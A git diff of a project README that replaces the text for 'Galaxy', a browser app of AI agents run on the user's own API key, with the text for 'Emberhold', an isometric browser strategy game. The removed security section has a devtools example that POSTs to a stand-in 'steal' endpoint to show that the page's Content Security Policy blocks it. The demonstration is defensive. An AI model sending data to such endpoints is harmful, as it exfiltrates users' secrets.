@@ -1,102 +1,80 @@
-# Galaxy
+# Emberhold
 
-### → [Use it](https://deviljoker1911-beep.github.io/ShipByThursday_via_claude/)
+### → [Play it](https://deviljoker1911-beep.github.io/ShipByThursday_via_claude/)
 
-**A room of AI colleagues who disagree with each other.** Built in 72 hours with
-Claude, in the open.
-
-Not one assistant — a working session. A founder who kills ideas, an engineer who
-runs real code and says what will break, a PM who cuts scope, a salesperson who
-knows what people actually pay for. They search the web, execute code, read
-repositories, and hand work to each other when it isn't theirs.
-
-Runs entirely in your browser on your own Anthropic API key. **There is no server
-in this product** — no account, no database, nothing to breach. The build output
-is static files.
+A small isometric real-time strategy game. Gather, build, train, fight. Runs in
+any browser on desktop and mobile, and installs as an app. Built with Claude, in
+the open, in 72 hours.
 
 ---
 
-## The premise
+## What it is
 
-xAI ran [Grok Bot Galaxy](https://x.ai/galaxy) September 15–17: three SpaceXAI
-staffers building a company from a blank whiteboard, live, with Grok Bot agents
-as the labor. This is the same challenge on the same clock with Claude — and the
-product is an open-source take on the thing being demoed.
+An **original** RTS in the classic mould — not a clone of, or successor to, any
+existing title. Its own units, its own map generation, its own art. Genre isn't
+ownable; a brand is, and this borrows neither name nor asset from anyone.
 
-Everything here was built with [Claude](https://claude.com/claude-code). Every
-commit is public. Every decision is logged, including the wrong ones.
+- **Isometric map**, procedurally generated and seeded — the same seed gives the
+  same valley, which matters when a bug only appears on one layout.
+- **Economy**: villagers fell trees and mine gold, carry ten at a time, and bank
+  it at a drop-off. Farms trickle food.
+- **Building**: houses raise the population cap, barracks train soldiers, farms
+  feed them. Sites are built by villagers and can be finished by several at once.
+- **Combat**: spearmen and archers, with range and cooldowns. Idle soldiers
+  defend themselves.
+- **An opponent** that economises, expands housing when capped, and attacks in
+  waves that grow. It cheats at nothing — same costs, same build times, same
+  gather rates as you.
 
-## Bring your own key
+## Controls
 
-You need an [Anthropic API key](https://console.anthropic.com/settings/keys).
+|  | Desktop | Touch |
+|---|---|---|
+| Select | click, or drag a box | tap, or drag a box |
+| Order | click the ground, a tree, or an enemy | same |
+| Pan | right-drag, or WASD / arrows | drag with two fingers |
+| Zoom | scroll wheel | — |
+| Cancel placement | `Esc` | tap the highlighted build button again |
 
-**A Claude Pro or Max subscription does not include API access** — it's billed
-separately through the Console. The same is true of ChatGPT Plus and the OpenAI
-API. There's no legitimate way for a third-party app to use a consumer
-subscription, so this app doesn't pretend otherwise.
+With units selected, a click is an **order**, not a re-selection — clicking a
+tree sends villagers to chop it, clicking an enemy attacks. That's the genre
+convention and it's what your hands will expect.
 
-Your key is held in your browser's local storage and sent only to
-`api.anthropic.com`. It never reaches a server of ours, because there isn't one.
-You pay Anthropic directly for exactly what the room uses; the running total sits
-in the header.
+## Honest scope
 
-## What the bots can do
+This is a **vertical slice**, not a finished game. Three days with one
+person and an AI buys the core loop working properly; it does not buy what a
+studio ships. Deliberately absent:
 
-| Capability | How |
-|---|---|
-| Search the web | Anthropic's server-side `web_search` tool |
-| Read pages | server-side `web_fetch` |
-| Execute real code | server-side `code_execution` — a real sandbox, not a description of one |
-| Read a repo's history | client-side GitHub reader, sampled across the project's whole life |
-| Hand work to a teammate | `hand_off` tool — ends that bot's turn and briefs the next |
-
-The sandbox and web tools run on Anthropic's infrastructure. That's the reason
-this was buildable in three days rather than three months: no VM fleet to
-operate.
-
-### Deliberately not built
-
-A persistent hosted desktop where a bot logs into services as a human, and
-learning a task from a screen recording. Both are infrastructure problems rather
-than orchestration problems, and neither fits in 72 hours. Saying so beats
-faking them.
-
-## Is it safe to paste a key in?
-
-Judge it from the artifact rather than the promise. The deployed site is static
-files — `next build` emits no server, so there is no backend that could receive
-a key, log a prompt, or be breached. The key is held in your browser's local
-storage and attached to requests made by your own browser.
-
-On top of that the page ships a Content Security Policy whose `connect-src`
-allows exactly two destinations. Open devtools on the live site and try it:
-
-```js
-await fetch("https://api.anthropic.com/v1/messages", { method: "POST" }) // reaches Anthropic (401)
-await fetch("https://api.github.com/repos/sveltejs/svelte")              // reaches GitHub (200)
-await fetch("https://example.org/steal", { method: "POST" })             // blocked by CSP
-```
-
-Even if something hostile reached the page, the browser refuses to send your key
-anywhere else. No external origin may load a script at all, and the referrer
-policy is `no-referrer` so keys can't leak through URLs.
+- **Multiplayer.** Networked RTS needs lockstep determinism and rollback — a
+  project in its own right, not a feature.
+- **Fog of war**, tech ages, unit upgrades, campaign, sound.
+- **Formations and group pathing.** Units separate so they don't stack, but
+  they path individually; a large group will straggle.
 
 ## Run it
 
 ```bash
 npm install
-npm run dev
+npm run dev     # http://localhost:3000
+npm test        # 14 headless simulation tests
+npm run build   # static files in out/
 ```
 
-Then add your key in Settings. `npm test` runs the suite; `npm run build`
-produces static files that deploy anywhere.
+> Don't run a build while `npm run dev` is live — they share `.next`, and the
+> dev server starts throwing runtime errors that look like app bugs.
 
-> One gotcha: don't run `npm run build` while `npm run dev` is live — they share
-> `.next` and the dev server will start throwing runtime errors that look like
-> app bugs.
+## How it's tested
 
-## Follow along
+The simulation has no dependency on the renderer, so it's tested headlessly:
+build a world, issue orders, run thousands of fixed timesteps in milliseconds,
+assert on the result. `npm test` plays out real matches — a villager's full
+gather loop, a construction site, a unit dying, the AI developing its base over
+three simulated minutes, a match ending.
 
-- Build log: [`docs/build-log.md`](docs/build-log.md) — including the dead ends
-- Decisions: [`docs/decisions.md`](docs/decisions.md)
-- `git log --reverse` reads as a diary of the three days
+That found two bugs a play-through would have taken much longer to pin down,
+both the same shape and both invisible in a screenshot. See
+[`docs/build-log.md`](docs/build-log.md).
+
+Map generation is asserted across 40 seeds, because a start with no reachable
+wood isn't a hard match — it's an unplayable one.
